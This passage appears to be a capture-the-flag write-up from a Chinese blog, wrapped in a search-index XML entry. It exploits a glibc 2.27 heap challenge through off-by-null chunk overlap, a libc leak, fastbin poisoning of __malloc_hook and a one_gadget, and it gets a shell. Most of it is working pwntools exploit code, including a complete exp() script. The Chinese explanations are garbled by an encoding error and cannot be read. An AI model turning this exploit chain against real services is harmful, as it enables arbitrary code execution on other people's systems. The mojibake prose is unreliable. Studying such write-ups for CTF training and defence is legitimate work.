<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#1</span>

show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
main_arenas <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span>
__malloc_hook <span class="token operator">=</span> main_arenas <span class="token operator">-</span> <span class="token number">0x10</span>
libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
__free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>
fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'main_arenas = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arenas<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__malloc_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__free_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'fake_chunk = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>åˆ†å‰²ï¼Œå¾€åºå·ä¸º0çš„chunkå†™å…¥ä¿¡æ¯</p>
<p><img src="https://s2.loli.net/2024/08/19/zJxdmLUZipaluF7.png" alt="03c8fcd6d8f44f908ed7bcccd2d0e2b9.png"></p>
<p>è¿™é‡Œçš„fake_chunkæ˜¯æˆ‘å½“æ—¶ç›´æ¥è°ƒè¯•å‡ºæ¥çš„ä½ç½®ã€‚åœ¨__malloc_hook - 0x23ä½ç½®</p>
<p><img src="https://s2.loli.net/2024/08/19/zqt6ULu8sBYCmya.png" alt="b55564ca6dcd46c4b1f039ba59575f0b.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/JRnHfGgMi5zKckX.png" alt="d91bdaa716b244d398970448d370503d.png"></p>
<p>4ï¼Œç”³è¯·0x100çš„chunkï¼Œå°†å‰é¢çš„è¿˜å¤„äºunsortbinsé‡Œé¢çš„chunkç»™ç”³è¯·å‡ºæ¥ã€‚è‚¯å®šæœ‰äººå’Œæˆ‘ä¸€æ ·ç–‘æƒ‘ä¸ºä»€ä¹ˆç”³è¯·0x100å°±å¯ä»¥ç”³è¯·å®Œäº†ï¼Ÿé‚£ä¸ªchunkçš„sizeå¤§å°ä¸æ˜¯0x120å˜›ï¼Ÿä½†æ˜¯æ‚¨ä¸èƒ½å¿˜æ‰äº†ï¼Œé‚£ä¸ª0x120æ˜¯æ‚¨è‡ªå·±ä¼ªé€ çš„ï¼Œå…¶å®ç¬¬ä¸‰å—chunkçš„å¤§å°å°±æ˜¯0x100ã€‚åœ¨åˆ©ç”¨off-by-nullå’Œå‰é¢æ‰‹æ³•ä¸€æ ·ï¼Œåªä¸è¿‡åˆ©ç”¨çš„sizeå¤§å°ä¸ä¸€æ ·ï¼ˆä¸ºäº†åé¢å¯ä»¥ç”³è¯·åˆ°fake_chunkå¤„ï¼‰ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#2</span>

add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#3ï¼Œæ­¤æ—¶chunk_3å’Œchunk_0é‡å äº†ï¼Œä¸èƒ½ç”¨double free</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span><span class="token comment">#4</span>
add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#5</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#6 éš”ç¦»top chunk</span>

free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x170</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#3</span>
free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>5ï¼Œæ­¤æ—¶ï¼Œæœ‰ç‚¹å°´å°¬ã€‚åºå·ä¸º3çš„chunkå…¶å®è¢«æˆ‘ä»¬ç”³è¯·å‡ºæ¥çš„ã€‚ä½†æ˜¯å‘¢ï¼Œå®ƒå› ä¸ºå †é‡å ï¼Œè¿˜åœ¨unsortbinsé‡Œé¢ã€‚æ­¤æ—¶unsortbinsé‡Œé¢å…¶å†…å­˜å†å¼€å¤´å¤„</p>
<p><img src="https://s2.loli.net/2024/08/19/gAfWK1q6EHOdRZh.png" alt="4f5d9e12c4314981870d1c3b37ecd192.png"></p>
<p>æˆ‘ä»¬å°†åºå·ä¸º3çš„chunkç»™freeæ‰ï¼Œè®©å…¶æ‰å…¥fastbinsé‡Œé¢ã€‚å…¶ä¹Ÿåœ¨unsortbinsé‡Œé¢ã€‚æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡ç”³è¯·ä¸€ä¸ªchunkæ¥ä¿®æ”¹æ‰å…¶fdæŒ‡é’ˆä»è€Œå¯ä»¥ä¼ªé€ ç”³è¯·åˆ°æˆ‘ä»¬æ‰€æŒ‡å®šçš„ä½ç½®</p>
<p><img src="https://s2.loli.net/2024/08/19/dncFRrphNHVkLv6.png" alt="8c5c556d9ab7494b891bf9bdb64afa12.png"></p>
<p>å¯ä»¥çœ‹åˆ°å…¶ä¹‹é—´ç›¸å·®0x100ï¼Œå› ä¸ºæˆ‘ä»¬ä¸èƒ½ç›´æ¥ç”³è¯·0x100çš„chunkã€‚æ‰€ä»¥é€šè¿‡ä¸¤æ¬¡ç”³è¯·chunkæ¥ä¿®æ”¹fastbinsé‡Œé¢chunkçš„fdæŒ‡é’ˆã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#è¿™ä¸€æ­¥å¯¼è‡´å…¶è¿›å…¥åˆ°fastbinsé‡Œé¢</span>
add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#3</span>
add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>è‡³äºåç§»å•¥çš„ï¼Œéƒ½æ˜¯è‡ªå·±è°ƒè¯•è®¡ç®—å‡ºæ¥çš„ã€‚ä½†é‚£ä¸ª0x71æ˜¯å› ä¸ºï¼Œä½ ç”³è¯·ä¹‹åunsortbinsè¿˜æœ‰chunkã€‚ä½ æœ€å¥½è¿˜æ˜¯åˆ«åŠ¨ï¼Œå› ä¸ºæˆ‘æ€•åˆæŠ¥é”™ã€‚è¿›è€Œä¿®æ”¹æ‰fastbinsé‡Œé¢chunkçš„fdæŒ‡é’ˆã€‚ä½¿å…¶æŒ‡å‘fake_chunkä½ç½®</p>
<p><img src="https://s2.loli.net/2024/08/19/4PhodtiJ2GVTLkc.png" alt="30f068e102774320b60cbfa748672d75.png"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ç”³è¯·è¿‡å»ï¼Œç„¶åæŠŠ__malloc_hookä¿®æ”¹ä¸ºone_gadgetã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>oog<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æœ€ågetshell</p>
<p><img src="https://s2.loli.net/2024/08/19/m6sglfjXMwNotJR.png" alt="5252281a67554f09b56a2ffb48a232fa.png"></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    oog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2be</span><span class="token punctuation">,</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span><span class="token comment">#2.27</span>
    
    <span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token comment">#0-6</span>
        add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#7-13</span>
        add<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#14 - 20</span>
        add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">)</span><span class="token comment">#21 - 27</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#28</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#29</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#30</span>
    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'dddd'</span><span class="token punctuation">)</span><span class="token comment">#31</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        free<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment">#0-27è¢«freeæ‰äº†</span>
    <span class="token comment">#å°†ä¸Šé¢å°†å¯¹åº”å¤§å°çš„tcacheå¡«æ»¡</span>

    free<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0</span>
    free<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>
    
    <span class="token comment"># add(0xc0,'aaaa')#1</span>
    <span class="token comment"># add(0x20,'aaaa')#2</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#1</span>

    show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    main_arenas <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span>
    __malloc_hook <span class="token operator">=</span> main_arenas <span class="token operator">-</span> <span class="token number">0x10</span>
    libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
    __free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>
    fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>

    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'main_arenas = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arenas<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__malloc_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__free_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'fake_chunk = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#2</span>

    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#3ï¼Œæ­¤æ—¶chunk_3å’Œchunk_0é‡å äº†ï¼Œä¸èƒ½ç”¨double free</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span><span class="token comment">#4</span>
    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#5</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#6 éš”ç¦»top chunk</span>

    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x170</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#3</span>
    free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    
    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#è¿™ä¸€æ­¥å¯¼è‡´å…¶è¿›å…¥åˆ°fastbinsé‡Œé¢</span>
    add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#3</span>
    add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4</span>
    
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>oog<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>  
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>tcache</tag>
        <tag>é«˜libc</tag>
      </tags>
  </entry>
</search>
